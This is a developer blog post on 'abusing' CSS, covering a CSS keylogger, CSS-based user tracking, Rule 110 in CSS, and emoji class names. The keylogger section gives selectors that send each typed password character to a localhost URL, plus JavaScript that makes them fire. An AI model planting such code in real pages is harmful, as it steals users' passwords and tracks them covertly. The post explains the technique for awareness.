+++
title = "CSS Can Do This... And It's Terrifying!"
date = 2019-08-14T11:33:46+10:00
description = "A look at how you can abuse CSS for evil(?)"
draft = false
tags = ["css"]
+++

{{< tweet 1161443226580127745 >}}

Inspired by today's _#DevDiscuss_ I commented with my favourite misdeeds in CSS.

{{< tweet 1161446544723202048 >}}

So let's have a look at how they work.

## CSS Keylogger

This has [been around for a while now](https://github.com/maxchehab/CSS-Keylogging/) that you can use CSS to create a keylogger, but as is rightly pointed out in [this post](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/) it's not "really" just CSS, it does rely on some JavaScript. So let's dissect how it works.

We have our selector like so:

```css
input[type="password"][value$="a"] {
    background-image: url("http://localhost:3000/a");
}
```

_Assume it's repeated for every character you want to log._

The important part of the selector is the substring match on `value`, this part: `[value$="a"]`. This is an [attribute selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors), specifically a substring selector that was added as part of [CSS 3](https://drafts.csswg.org/selectors-3/#attribute-substrings) and what it's doing is saying is that it'll match when the `value` attribute of the DOM element ends with `a` (you can use `^` for begins with if you wanted).

So we're matching when the `value` attribute contains that but if you were to look into the DOM of a form on a page you'll notice something, the `value` attribute isn't set. Here, take a look at this:

<input type="text" value="Test here" id="demo-01" />

If you open up the dev tools in your browser you'll notice that when you type in the input the **attribute** doesn't change, it's always set to `Test here`. But if you were to use JavaScript to inspect the value, `document.getElementById('demo-01').value` it'll have what _you_ entered. This is because the attribute represents the [default value](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#concept-fe-value) of the `<input>`, not the current value, that's something that might get computed, depending on the type of input you have.

What does it mean for us creating a keylogger in CSS? Well, the simple fact is that you can't create one **purely** with CSS but you can create one with CSS and a bit of JavaScript because we're going to need to update the `value` attribute along the way.

This is quite easy to do, you just need some JavaScript like this:

```js
let inputs = document.getElementsByTagName("input");

for (let i = 0; i < inputs.length; i++) {
    let input = inputs[i];

    input.addEventListener("keypress", e => {
        e.preventDefault();
        let char = String.fromCharCode(e.keyCode);
        let newValue = input.value + char;
        input.setAttribute("value", newValue);
        input.setSelectionRange(newValue.length, newValue.length);
    });
}
```

What this does is it "pretends" that you're doing your keypress appropriately by catching it early and then pushing the character you _intended_ to enter onto the `value` attribute, making it look like you were typing normally. We then use the `setSelectionRange` method on the input to position the caret to the end of the input so you are none the wiser. [A demo can be found here of this in action]({{< ref "/demos/css-hacking/keylogger.md" >}}).

But if you're able to run JavaScript to bypass how the DOM works, why bother with CSS anyway? The problem isn't so much the code _you_ write but more the code you might leverage, in particular, UI frameworks.

For example, React synchronises the `value` attribute with state if you're using a controlled form, which is something that [this issue](https://github.com/facebook/react/issues/11896) tracks. So if you're on a website that is using React then that website is vulnerable to this kind of an attack, whether it's through an extension in your browser or some dodgy ad running on the site.

Yes, you require JavaScript to properly implement a "CSS keylogger", but that doesn't mean that you have to write the JavaScript.

I just want to quickly touch on some points the author makes in [this post](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/). They state that it's not really a big deal because the `background-image` is only done for the first match so repeated characters won't pick up (e.g. a password of `password` will miss a `s`), and that is true (the `value` didn't change the last character at `pass` so the selector wasn't triggered) but the data capture will include timestamps and if you take a level of variance between the timestamp of events you can extrapolate your own gaps (if it took 0.1ms between captures and then there was an 0.5, maybe some characters were duplicated). The same goes for the observation that the order-of-receive isn't guaranteed. That's true, the server may receive them out of order, but when you have all (or 90+%) characters of a password the ability to brute force goes down drastically.

## User Tracking with CSS

This is not quite as scary as a keylogger but it does borrow the same underlying principle as the keylogger.

For this we're going to exploit [CSS Pseudo-Classes](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes), which allow us to hook into a number of events of DOM elements.

<div id="demo-02">
    <p>Hover over me</p>
    <input type="text" placeholder="focus on me" />
    <button>Click me</button>
</div>

<style>
#demo-02 p:hover {
    background-color: #f0a;
}

#demo-02 input:focus {
    background-color: #bada55
}

#demo-02 button:active {
    color: #ff0000;
}
</style>

Here's the CSS that I applied to those elements:

```css
#demo-02 p:hover {
    background-color: #f0a;
}

#demo-02 input:focus {
    background-color: #bada55;
}

#demo-02 button:active {
    color: #ff0000;
}
```

I'm just using pseudo-classes like `:hover`, `:focus` and `:active` to know when you've done something and then change some colours, but again I could be setting the `background-image` to a tracking URL.

How could this be made useful? Well, think of it like implementing Google Analytics, you could do something like attach a `:hover` state to the `body` element so you know when the page is appearing for the user and then more hover states on all the child elements; as the user moves around the page you're capturing the rough position of their cursor and knowing what they are spending their time on. If there's a form you can work out how long they spent on each field, how they navigate forwards and backwards through a multi-step form, or if they change answers on radio buttons/checkboxes.

Like the keylogger it isn't as straight forward as it might seem, you would have to have a decent idea of the structure of the DOM to be able to create a really fine-grade tracker (or use JavaScript), but if you're using it for your own analytics it's very achievable.

## CSS is Turing Complete

_Ok, CSS + HTML if you want to be pedantic_ but it's true, it is possible to implement [Rule 110](https://en.wikipedia.org/wiki/Rule_110) with just CSS and HTML:

{{< youtube Ak_sWZyHi3E >}}

Credit to [eliheeli](https://github.com/elitheeli) on GitHub for the [working example of it](https://github.com/elitheeli/stupid-machines/tree/master/rule110).

This works by abusing Pesudo-classes like our tracker and combining those with the [Adjacent sibling combinator](https://developer.mozilla.org/en-US/docs/Web/CSS/Adjacent_sibling_combinator). The adjacent sibing combinator, or `+` for short, works like this:

<div id="demo-03">
    <p>I'm a paragraph.</p>
    <p>I'm an adjacent paragraph</p>
</div>

<style>
#demo-03 p {
    color: #00bb00;
}

#demo-03 p + p {
    font-family: 'Comic Sans MS', sans serif;
    font-style: italic;
}
</style>

```css
#demo-03 p {
    color: #00bb00;
}

#demo-03 p + p {
    font-family: "Comic Sans MS", sans serif;
    font-style: italic;
}
```

Here we're applying a rule to all `p` elements, but then we're using the adjacent sibling selector to apply a rule to the 2nd `p` only (in this case, turning on a different font family and style). By applying conditions on the first half of the selector, such as a pesudo-class, the cascade of the rules can be greatly limited.

## Emoji Class Names

Who doesn't love themselves a liberal usage of Emoji's throughout their work? Well did you know that you can use Emoji as the class names in CSS? According [to the spec](https://www.w3.org/TR/CSS21/syndata.html#characters) they are _technically_ valid, meaning you can do this:

<div id="demo-04">
 <p class="🤣">Hello!</p>
</div>

<style>
#demo-04 .🤣 {
    font-family: 'Comic Sans MS';
    text-decoration: #f0a underline overline wavy;
    text-shadow: 2px 2px #bada55;
    transform: rotate(45deg);
    display: inline-block;
}
</style>

```css
#demo-04 .🤣 {
    font-family: "Comic Sans MS";
    text-decoration: #f0a underline overline wavy;
    text-shadow: 2px 2px #bada55;
    transform: rotate(45deg);
    display: inline-block;
}
```

In reality [you probably shouldn't do this](http://adrianroselli.com/2017/10/avoid-emoji-as-class-names.html), but hey, you could shave a few bytes over the wire for the sake of a few users not being able to access your site (or dev on your codebase)!

## Conclusion

What started from a throw-away tweet became the catalyst for writing a post I've been meaning to do for a few years now! 🤣

I hope you've enjoyed a look at a few things you **can** do with CSS, but maybe **shouldn't**.

What are your favourite ways to exploit CSS?
